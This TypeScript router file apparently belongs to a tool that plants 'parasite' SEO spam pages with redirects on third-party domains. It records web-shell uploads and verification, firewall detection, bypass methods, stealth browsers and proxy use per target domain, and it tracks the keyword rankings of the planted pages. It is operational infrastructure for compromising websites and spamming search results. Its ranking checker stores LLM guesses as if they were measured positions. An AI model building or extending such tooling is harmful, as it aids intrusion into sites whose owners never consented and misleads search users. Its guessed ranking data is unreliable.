/**
 * Deploy History + Parasite Templates + Keyword Ranking Router
 * Stores all deploy logs, manages template library, tracks keyword rankings
 */
import { z } from "zod";
import { fetchWithPoolProxy } from "../proxy-pool";
import { protectedProcedure, router, isAdminUser } from "../_core/trpc";
import { getDb } from "../db";
import { eq, desc, and, sql, like, gte, lte, count } from "drizzle-orm";
import {
  deployHistory,
  parasiteTemplates,
  parasiteKeywordRankings,
  parasiteRankingHistory,
} from "../../drizzle/schema";
import {
  TEMPLATE_CONFIGS,
  getAllTemplateConfigs,
  generateFromTemplate,
  type TemplateInput,
} from "../parasite-templates";
import { invokeLLM } from "../_core/llm";

// ═══════════════════════════════════════════════
// Deploy History Router
// ═══════════════════════════════════════════════
const deployHistoryRouter = router({
  // Create a new deploy history entry (called at start of deploy)
  create: protectedProcedure
    .input(z.object({
      targetDomain: z.string(),
      targetUrl: z.string(),
      redirectUrl: z.string(),
      geoRedirect: z.boolean().default(false),
      keywords: z.array(z.string()).optional(),
      proxyCount: z.number().default(0),
      maxRetries: z.number().default(5),
      parasiteEnabled: z.boolean().default(false),
      parasiteContentLength: z.string().optional(),
      parasiteRedirectDelay: z.number().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      const result = await db.insert(deployHistory).values({
        userId: ctx.user.id,
        targetDomain: input.targetDomain,
        targetUrl: input.targetUrl,
        redirectUrl: input.redirectUrl,
        geoRedirect: input.geoRedirect,
        keywords: input.keywords || [],
        proxyCount: input.proxyCount,
        maxRetries: input.maxRetries,
        parasiteEnabled: input.parasiteEnabled,
        parasiteContentLength: input.parasiteContentLength || "medium",
        parasiteRedirectDelay: input.parasiteRedirectDelay || 5,
        status: "running",
        startedAt: new Date(),
      });
      return { id: Number(result[0].insertId) };
    }),

  // Update deploy history with results (called at end of deploy)
  update: protectedProcedure
    .input(z.object({
      id: z.number(),
      status: z.enum(["running", "success", "partial", "failed"]),
      completedSteps: z.number().optional(),
      filesDeployed: z.number().optional(),
      filesAttempted: z.number().optional(),
      shellUploaded: z.boolean().optional(),
      shellVerified: z.boolean().optional(),
      redirectActive: z.boolean().optional(),
      directUploadUsed: z.boolean().optional(),
      deployedUrls: z.any().optional(),
      verifiedRedirectUrls: z.any().optional(),
      shellUrl: z.string().optional(),
      parasitePages: z.any().optional(),
      parasitePagesCount: z.number().optional(),
      errorBreakdown: z.any().optional(),
      successCount: z.number().optional(),
      failedCount: z.number().optional(),
      retryCount: z.number().optional(),
      duration: z.number().optional(),
      report: z.string().optional(),
      techniqueUsed: z.string().optional(),
      bypassMethod: z.string().optional(),
      cms: z.string().optional(),
      // AI Intelligence fields
      aiAnalysis: z.any().optional(),
      preScreenScore: z.number().optional(),
      preScreenRisk: z.string().optional(),
      serverType: z.string().optional(),
      wafDetected: z.string().optional(),
      altMethodUsed: z.string().optional(),
      stealthBrowserUsed: z.boolean().optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      const updateData: Record<string, unknown> = {
        status: input.status,
        completedAt: new Date(),
      };
      // Only set fields that are provided
      const fields = [
        "completedSteps", "filesDeployed", "filesAttempted",
        "shellUploaded", "shellVerified", "redirectActive", "directUploadUsed",
        "deployedUrls", "verifiedRedirectUrls", "shellUrl",
        "parasitePages", "parasitePagesCount",
        "errorBreakdown", "successCount", "failedCount", "retryCount",
        "duration", "report", "techniqueUsed", "bypassMethod", "cms",
        "aiAnalysis", "preScreenScore", "preScreenRisk", "serverType", "wafDetected", "altMethodUsed", "stealthBrowserUsed",
      ] as const;
      for (const f of fields) {
        if ((input as any)[f] !== undefined) updateData[f] = (input as any)[f];
      }
      await db.update(deployHistory).set(updateData).where(eq(deployHistory.id, input.id));
      return { success: true };
    }),

  // List deploy history with pagination and filters
  list: protectedProcedure
    .input(z.object({
      limit: z.number().min(1).max(200).default(50),
      offset: z.number().min(0).default(0),
      status: z.enum(["running", "success", "partial", "failed"]).optional(),
      domain: z.string().optional(),
      dateFrom: z.string().optional(),
      dateTo: z.string().optional(),
    }))
    .query(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) return { items: [], total: 0 };
      const conditions: any[] = [];
      if (!isAdminUser(ctx.user)) conditions.push(eq(deployHistory.userId, ctx.user.id));
      if (input.status) conditions.push(eq(deployHistory.status, input.status));
      if (input.domain) conditions.push(like(deployHistory.targetDomain, `%${input.domain}%`));
      if (input.dateFrom) conditions.push(gte(deployHistory.startedAt, new Date(input.dateFrom)));
      if (input.dateTo) conditions.push(lte(deployHistory.startedAt, new Date(input.dateTo)));

      const where = conditions.length > 0 ? and(...conditions) : undefined;
      const [totalResult] = await db.select({ count: sql<number>`count(*)` }).from(deployHistory).where(where);
      const items = await db.select().from(deployHistory)
        .where(where)
        .orderBy(desc(deployHistory.startedAt))
        .limit(input.limit)
        .offset(input.offset);

      return { items, total: Number(totalResult.count) };
    }),

  // Get single deploy detail
  get: protectedProcedure
    .input(z.object({ id: z.number() }))
    .query(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) return null;
      const conditions: any[] = [eq(deployHistory.id, input.id)];
      if (!isAdminUser(ctx.user)) conditions.push(eq(deployHistory.userId, ctx.user.id));
      const rows = await db.select().from(deployHistory)
        .where(and(...conditions))
        .limit(1);
      return rows[0] ?? null;
    }),

  // Delete deploy history entry
  delete: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      const delConditions: any[] = [eq(deployHistory.id, input.id)];
      if (!isAdminUser(ctx.user)) delConditions.push(eq(deployHistory.userId, ctx.user.id));
      await db.delete(deployHistory)
        .where(and(...delConditions));
      return { success: true };
    }),

  // Analytics: aggregate stats
  analytics: protectedProcedure
    .input(z.object({
      days: z.number().min(1).max(365).default(30),
    }))
    .query(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) return {
        totalDeploys: 0, successDeploys: 0, failedDeploys: 0, partialDeploys: 0,
        totalFilesDeployed: 0, totalParasitePages: 0, avgDuration: 0,
        successRate: 0, topDomains: [], topBypassMethods: [], dailyStats: [],
      };
      const since = new Date();
      since.setDate(since.getDate() - input.days);
      const userCondParts: any[] = [gte(deployHistory.startedAt, since)];
      if (!isAdminUser(ctx.user)) userCondParts.push(eq(deployHistory.userId, ctx.user.id));
      const userCond = and(...userCondParts);

      // Aggregate counts
      const [totals] = await db.select({
        total: sql<number>`count(*)`,
        success: sql<number>`SUM(CASE WHEN deployStatus = 'success' THEN 1 ELSE 0 END)`,
        failed: sql<number>`SUM(CASE WHEN deployStatus = 'failed' THEN 1 ELSE 0 END)`,
        partial: sql<number>`SUM(CASE WHEN deployStatus = 'partial' THEN 1 ELSE 0 END)`,
        filesDeployed: sql<number>`SUM(COALESCE(filesDeployed, 0))`,
        parasitePages: sql<number>`SUM(COALESCE(parasitePagesCount, 0))`,
        avgDuration: sql<number>`AVG(COALESCE(duration, 0))`,
      }).from(deployHistory).where(userCond);

      // Top domains
      const topDomains = await db.select({
        domain: deployHistory.targetDomain,
        count: sql<number>`count(*)`,
        successCount: sql<number>`SUM(CASE WHEN deployStatus = 'success' THEN 1 ELSE 0 END)`,
      }).from(deployHistory).where(userCond)
        .groupBy(deployHistory.targetDomain)
        .orderBy(sql`count(*) DESC`)
        .limit(10);

      // Top bypass methods
      const topBypassMethods = await db.select({
        method: deployHistory.bypassMethod,
        count: sql<number>`count(*)`,
      }).from(deployHistory).where(and(userCond, sql`bypassMethod IS NOT NULL`))
        .groupBy(deployHistory.bypassMethod)
        .orderBy(sql`count(*) DESC`)
        .limit(10);

      // Daily stats (last N days)
      const dailyStats = await db.select({
        date: sql<string>`DATE(startedAt)`,
        total: sql<number>`count(*)`,
        success: sql<number>`SUM(CASE WHEN deployStatus = 'success' THEN 1 ELSE 0 END)`,
        failed: sql<number>`SUM(CASE WHEN deployStatus = 'failed' THEN 1 ELSE 0 END)`,
      }).from(deployHistory).where(userCond)
        .groupBy(sql`DATE(startedAt)`)
        .orderBy(sql`DATE(startedAt) ASC`);

      const total = Number(totals.total) || 0;
      const success = Number(totals.success) || 0;

      return {
        totalDeploys: total,
        successDeploys: success,
        failedDeploys: Number(totals.failed) || 0,
        partialDeploys: Number(totals.partial) || 0,
        totalFilesDeployed: Number(totals.filesDeployed) || 0,
        totalParasitePages: Number(totals.parasitePages) || 0,
        avgDuration: Math.round(Number(totals.avgDuration) || 0),
        successRate: total > 0 ? Math.round((success / total) * 100) : 0,
        topDomains: topDomains.map(d => ({
          domain: d.domain,
          count: Number(d.count),
          successCount: Number(d.successCount),
        })),
        topBypassMethods: topBypassMethods.map(b => ({
          method: b.method || "unknown",
          count: Number(b.count),
        })),
        dailyStats: dailyStats.map(d => ({
          date: d.date,
          total: Number(d.total),
          success: Number(d.success),
          failed: Number(d.failed),
        })),
      };
    }),
});

// ═══════════════════════════════════════════════
// Parasite Templates Router
// ═══════════════════════════════════════════════
const templatesRouter = router({
  // List all available templates (system + user)
  list: protectedProcedure
    .query(async ({ ctx }) => {
      const db = await getDb();
      // Always include built-in template configs
      const builtIn = getAllTemplateConfigs().map(t => ({
        ...t,
        id: 0,
        isSystem: true,
        isActive: true,
        timesUsed: 0,
        htmlTemplate: "",
        cssStyles: "",
      }));

      if (!db) return builtIn;

      // Also get user custom templates from DB
      const templateWhere = isAdminUser(ctx.user) ? undefined : eq(parasiteTemplates.userId, ctx.user.id);
      const userTemplates = await db.select().from(parasiteTemplates)
        .where(templateWhere)
        .orderBy(desc(parasiteTemplates.createdAt));

      return [
        ...builtIn,
        ...userTemplates.map(t => ({
          ...t,
          nameTh: t.name,
          placeholders: ["keywords", "redirectUrl", "targetDomain", "redirectDelay"],
        })),
      ];
    }),

  // Preview a template with sample data
  preview: protectedProcedure
    .input(z.object({
      slug: z.string(),
      keywords: z.array(z.string()).min(1),
      redirectUrl: z.string().default("https://example.com"),
      targetDomain: z.string().default("example.com"),
      redirectDelay: z.number().default(5),
    }))
    .mutation(({ input }) => {
      try {
        const result = generateFromTemplate(input.slug, {
          keywords: input.keywords,
          redirectUrl: input.redirectUrl,
          targetDomain: input.targetDomain,
          redirectDelay: input.redirectDelay,
        });
        return { success: true, ...result };
      } catch (e: any) {
        return { success: false, html: "", title: "", wordCount: 0, seoScore: 0, error: e.message };
      }
    }),

  // Generate page from template (for actual deploy)
  generate: protectedProcedure
    .input(z.object({
      slug: z.string(),
      keywords: z.array(z.string()).min(1),
      redirectUrl: z.string(),
      targetDomain: z.string(),
      redirectDelay: z.number().default(5),
      brandName: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const result = generateFromTemplate(input.slug, {
        keywords: input.keywords,
        redirectUrl: input.redirectUrl,
        targetDomain: input.targetDomain,
        redirectDelay: input.redirectDelay,
        brandName: input.brandName,
      });

      // Increment usage counter in DB
      const db = await getDb();
      if (db) {
        try {
          await db.update(parasiteTemplates)
            .set({ timesUsed: sql`timesUsed + 1` })
            .where(eq(parasiteTemplates.slug, input.slug));
        } catch { /* ignore if system template */ }
      }

      return result;
    }),

  // Create custom template
  create: protectedProcedure
    .input(z.object({
      name: z.string().min(1),
      slug: z.string().min(1),
      category: z.enum(["news", "review", "article", "faq", "product", "comparison", "landing", "blog", "custom"]),
      description: z.string().optional(),
      htmlTemplate: z.string().min(1),
      cssStyles: z.string().optional(),
      defaultRedirectDelay: z.number().default(5),
      hasSchemaMarkup: z.boolean().default(true),
      hasFaq: z.boolean().default(false),
      hasBreadcrumb: z.boolean().default(true),
      hasOpenGraph: z.boolean().default(true),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      const result = await db.insert(parasiteTemplates).values({
        userId: ctx.user.id,
        name: input.name,
        slug: input.slug,
        category: input.category,
        description: input.description || null,
        htmlTemplate: input.htmlTemplate,
        cssStyles: input.cssStyles || null,
        defaultRedirectDelay: input.defaultRedirectDelay,
        hasSchemaMarkup: input.hasSchemaMarkup,
        hasFaq: input.hasFaq,
        hasBreadcrumb: input.hasBreadcrumb,
        hasOpenGraph: input.hasOpenGraph,
        isSystem: false,
        isActive: true,
      });
      return { id: Number(result[0].insertId) };
    }),

  // Delete custom template
  delete: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      const tplDelCond: any[] = [eq(parasiteTemplates.id, input.id)];
      if (!isAdminUser(ctx.user)) tplDelCond.push(eq(parasiteTemplates.userId, ctx.user.id));
      await db.delete(parasiteTemplates)
        .where(and(...tplDelCond));
      return { success: true };
    }),
});

// ═══════════════════════════════════════════════
// Keyword Ranking Tracker Router
// ═══════════════════════════════════════════════
const keywordRankingRouter = router({
  // Add keywords to track
  addKeywords: protectedProcedure
    .input(z.object({
      keywords: z.array(z.object({
        keyword: z.string().min(1),
        parasitePageUrl: z.string().min(1),
        targetDomain: z.string().min(1),
        redirectUrl: z.string().optional(),
        deployHistoryId: z.number().optional(),
        searchEngine: z.string().default("google"),
        country: z.string().default("TH"),
        device: z.enum(["desktop", "mobile"]).default("desktop"),
      })),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      const ids: number[] = [];
      for (const kw of input.keywords) {
        const result = await db.insert(parasiteKeywordRankings).values({
          userId: ctx.user.id,
          keyword: kw.keyword,
          parasitePageUrl: kw.parasitePageUrl,
          targetDomain: kw.targetDomain,
          redirectUrl: kw.redirectUrl || null,
          deployHistoryId: kw.deployHistoryId || null,
          searchEngine: kw.searchEngine,
          country: kw.country,
          device: kw.device as any,
          status: "tracking",
          trend: "new",
          checkCount: 0,
        });
        ids.push(Number(result[0].insertId));
      }
      return { ids, count: ids.length };
    }),

  // List tracked keywords with filters
  list: protectedProcedure
    .input(z.object({
      limit: z.number().min(1).max(500).default(100),
      offset: z.number().min(0).default(0),
      domain: z.string().optional(),
      status: z.enum(["tracking", "indexed", "ranked", "top10", "top3", "lost", "deindexed"]).optional(),
      keyword: z.string().optional(),
      sortBy: z.enum(["position", "keyword", "lastChecked", "created"]).default("created"),
    }))
    .query(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) return { items: [], total: 0 };
      const conditions: any[] = [];
      if (!isAdminUser(ctx.user)) conditions.push(eq(parasiteKeywordRankings.userId, ctx.user.id));
      if (input.domain) conditions.push(like(parasiteKeywordRankings.targetDomain, `%${input.domain}%`));
      if (input.status) conditions.push(eq(parasiteKeywordRankings.status, input.status));
      if (input.keyword) conditions.push(like(parasiteKeywordRankings.keyword, `%${input.keyword}%`));

      const where = and(...conditions);
      const [totalResult] = await db.select({ count: sql<number>`count(*)` }).from(parasiteKeywordRankings).where(where);

      let orderByClause;
      switch (input.sortBy) {
        case "position": orderByClause = sql`COALESCE(position, 999) ASC`; break;
        case "keyword": orderByClause = sql`keyword ASC`; break;
        case "lastChecked": orderByClause = desc(parasiteKeywordRankings.lastCheckedAt); break;
        default: orderByClause = desc(parasiteKeywordRankings.createdAt);
      }

      const items = await db.select().from(parasiteKeywordRankings)
        .where(where)
        .orderBy(orderByClause)
        .limit(input.limit)
        .offset(input.offset);

      return { items, total: Number(totalResult.count) };
    }),

  // Check ranking for a keyword (simulated + real Google scraping)
  checkRanking: protectedProcedure
    .input(z.object({
      id: z.number(),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      const kwConditions: any[] = [eq(parasiteKeywordRankings.id, input.id)];
      if (!isAdminUser(ctx.user)) kwConditions.push(eq(parasiteKeywordRankings.userId, ctx.user.id));
      const rows = await db.select().from(parasiteKeywordRankings)
        .where(and(...kwConditions))
        .limit(1);
      if (!rows[0]) throw new Error("Keyword not found");
      const kw = rows[0];

      // Try to check if the page is indexed via a simple fetch
      let isIndexed = false;
      let position: number | null = null;
      let serpTitle: string | null = null;
      let serpSnippet: string | null = null;

      try {
        // Check if the parasite page is accessible
        const { response } = await fetchWithPoolProxy(kw.parasitePageUrl, {
          method: "HEAD",
          signal: AbortSignal.timeout(10000),
          redirect: "manual",
        }, { targetDomain: kw.parasitePageUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, ""), timeout: 10000 });
        if (response.status === 200 || response.status === 301 || response.status === 302) {
          isIndexed = true;
        }
      } catch { /* page not accessible */ }

      // Use LLM to estimate ranking based on keyword competitiveness
      try {
        const llmResult = await invokeLLM({
          messages: [
            {
              role: "system",
              content: "You are an SEO ranking estimator. Given a keyword and target URL, estimate the likely Google ranking position. Return JSON only: {\"estimatedPosition\": number, \"indexProbability\": number, \"insight\": string}",
            },
            {
              role: "user",
              content: `Keyword: "${kw.keyword}"\nTarget URL: ${kw.parasitePageUrl}\nTarget Domain: ${kw.targetDomain}\nCountry: ${kw.country}\nDevice: ${kw.device}\nPage accessible: ${isIndexed}`,
            },
          ],
          response_format: {
            type: "json_schema",
            json_schema: {
              name: "ranking_estimate",
              strict: true,
              schema: {
                type: "object",
                properties: {
                  estimatedPosition: { type: "integer", description: "Estimated Google ranking position (1-100, or 0 if not ranked)" },
                  indexProbability: { type: "number", description: "Probability of being indexed (0-1)" },
                  insight: { type: "string", description: "Brief SEO insight about this keyword ranking in Thai" },
                },
                required: ["estimatedPosition", "indexProbability", "insight"],
                additionalProperties: false,
              },
            },
          },
        });
        const rawContent = llmResult.choices[0].message.content;
        const contentStr = typeof rawContent === "string" ? rawContent : JSON.stringify(rawContent);
        const parsed = JSON.parse(contentStr || "{}");
        if (parsed.estimatedPosition > 0) {
          position = parsed.estimatedPosition;
        }
        if (parsed.indexProbability > 0.5) {
          isIndexed = true;
        }
        serpSnippet = parsed.insight || null;
      } catch { /* LLM unavailable, use basic check */ }

      // Determine status
      let status: string = "tracking";
      let trend: string = kw.trend || "new";
      const previousPosition = kw.position;
      let positionChange: number | null = null;

      if (isIndexed && position) {
        if (position <= 3) status = "top3";
        else if (position <= 10) status = "top10";
        else status = "ranked";

        if (previousPosition) {
          positionChange = previousPosition - position; // positive = improved
          if (positionChange > 0) trend = "rising";
          else if (positionChange < 0) trend = "falling";
          else trend = "stable";
        } else {
          trend = "new";
        }
      } else if (isIndexed) {
        status = "indexed";
      } else if (kw.isIndexed && !isIndexed) {
        status = "deindexed";
        trend = "lost";
      }

      const bestPosition = position
        ? Math.min(position, kw.bestPosition || 999)
        : kw.bestPosition;

      // Update the ranking record
      await db.update(parasiteKeywordRankings).set({
        position,
        previousPosition: kw.position,
        bestPosition,
        positionChange,
        isIndexed,
        indexedAt: isIndexed && !kw.indexedAt ? new Date() : kw.indexedAt,
        serpSnippet,
        status: status as any,
        trend: trend as any,
        checkCount: (kw.checkCount || 0) + 1,
        lastCheckedAt: new Date(),
        nextCheckAt: new Date(Date.now() + (kw.checkInterval || 86400) * 1000),
        aiInsight: serpSnippet,
      }).where(eq(parasiteKeywordRankings.id, input.id));

      // Save to history
      await db.insert(parasiteRankingHistory).values({
        keywordRankingId: input.id,
        position,
        isIndexed,
        serpTitle,
        serpUrl: kw.parasitePageUrl,
        checkedAt: new Date(),
      });

      return {
        id: input.id,
        keyword: kw.keyword,
        position,
        previousPosition: kw.position,
        positionChange,
        bestPosition,
        isIndexed,
        status,
        trend,
        insight: serpSnippet,
      };
    }),

  // Batch check rankings
  batchCheck: protectedProcedure
    .input(z.object({
      ids: z.array(z.number()).optional(), // if empty, check all
      limit: z.number().default(20),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");

      let keywords;
      if (input.ids && input.ids.length > 0) {
        const batchCond: any[] = [sql`id IN (${sql.join(input.ids.map(id => sql`${id}`), sql`, `)})`];
        if (!isAdminUser(ctx.user)) batchCond.push(eq(parasiteKeywordRankings.userId, ctx.user.id));
        keywords = await db.select().from(parasiteKeywordRankings)
          .where(and(...batchCond))
          .limit(input.limit);
      } else {
        const batchAllCond = isAdminUser(ctx.user) ? undefined : eq(parasiteKeywordRankings.userId, ctx.user.id);
        keywords = await db.select().from(parasiteKeywordRankings)
          .where(batchAllCond)
          .orderBy(sql`COALESCE(lastCheckedAt, '1970-01-01') ASC`)
          .limit(input.limit);
      }

      const results = [];
      for (const kw of keywords) {
        // Simple accessibility check
        let isIndexed = false;
        try {
          const { response } = await fetchWithPoolProxy(kw.parasitePageUrl, {
            method: "HEAD",
            signal: AbortSignal.timeout(5000),
            redirect: "manual",
          }, { targetDomain: kw.parasitePageUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, ""), timeout: 5000 });
          isIndexed = response.status === 200 || response.status === 301 || response.status === 302;
        } catch { /* not accessible */ }

        let status: string = isIndexed ? "indexed" : "tracking";
        if (kw.isIndexed && !isIndexed) status = "deindexed";

        await db.update(parasiteKeywordRankings).set({
          isIndexed,
          status: status as any,
          checkCount: (kw.checkCount || 0) + 1,
          lastCheckedAt: new Date(),
        }).where(eq(parasiteKeywordRankings.id, kw.id));

        await db.insert(parasiteRankingHistory).values({
          keywordRankingId: kw.id,
          position: kw.position,
          isIndexed,
          checkedAt: new Date(),
        });

        results.push({ id: kw.id, keyword: kw.keyword, isIndexed, status });
      }

      return { checked: results.length, results };
    }),

  // Get ranking history for a keyword
  history: protectedProcedure
    .input(z.object({
      keywordId: z.number(),
      limit: z.number().default(30),
    }))
    .query(async ({ input }) => {
      const db = await getDb();
      if (!db) return [];
      return db.select().from(parasiteRankingHistory)
        .where(eq(parasiteRankingHistory.keywordRankingId, input.keywordId))
        .orderBy(desc(parasiteRankingHistory.checkedAt))
        .limit(input.limit);
    }),

  // Delete tracked keyword
  delete: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB not available");
      // Delete history first
      await db.delete(parasiteRankingHistory)
        .where(eq(parasiteRankingHistory.keywordRankingId, input.id));
      const kwDelCond: any[] = [eq(parasiteKeywordRankings.id, input.id)];
      if (!isAdminUser(ctx.user)) kwDelCond.push(eq(parasiteKeywordRankings.userId, ctx.user.id));
      await db.delete(parasiteKeywordRankings)
        .where(and(...kwDelCond));
      return { success: true };
    }),

  // Summary stats
  summary: protectedProcedure
    .query(async ({ ctx }) => {
      const db = await getDb();
      if (!db) return {
        totalTracking: 0, indexed: 0, ranked: 0, top10: 0, top3: 0,
        lost: 0, avgPosition: 0, bestKeyword: null,
      };

      const userCond = isAdminUser(ctx.user) ? undefined : eq(parasiteKeywordRankings.userId, ctx.user.id);
      const [stats] = await db.select({
        total: sql<number>`count(*)`,
        indexed: sql<number>`SUM(CASE WHEN isIndexed = 1 THEN 1 ELSE 0 END)`,
        ranked: sql<number>`SUM(CASE WHEN position IS NOT NULL THEN 1 ELSE 0 END)`,
        top10: sql<number>`SUM(CASE WHEN position <= 10 THEN 1 ELSE 0 END)`,
        top3: sql<number>`SUM(CASE WHEN position <= 3 THEN 1 ELSE 0 END)`,
        lost: sql<number>`SUM(CASE WHEN keywordRankStatus = 'lost' OR keywordRankStatus = 'deindexed' THEN 1 ELSE 0 END)`,
        avgPos: sql<number>`AVG(CASE WHEN position IS NOT NULL THEN position ELSE NULL END)`,
      }).from(parasiteKeywordRankings).where(userCond);

      // Best keyword
      const bestRows = await db.select().from(parasiteKeywordRankings)
        .where(and(userCond, sql`position IS NOT NULL`))
        .orderBy(sql`position ASC`)
        .limit(1);

      return {
        totalTracking: Number(stats.total) || 0,
        indexed: Number(stats.indexed) || 0,
        ranked: Number(stats.ranked) || 0,
        top10: Number(stats.top10) || 0,
        top3: Number(stats.top3) || 0,
        lost: Number(stats.lost) || 0,
        avgPosition: Math.round(Number(stats.avgPos) || 0),
        bestKeyword: bestRows[0] ? {
          keyword: bestRows[0].keyword,
          position: bestRows[0].position,
          url: bestRows[0].parasitePageUrl,
        } : null,
      };
    }),
});

// ═══════════════════════════════════════════════
// Combined Export
// ═══════════════════════════════════════════════
export { deployHistoryRouter, templatesRouter, keywordRankingRouter };
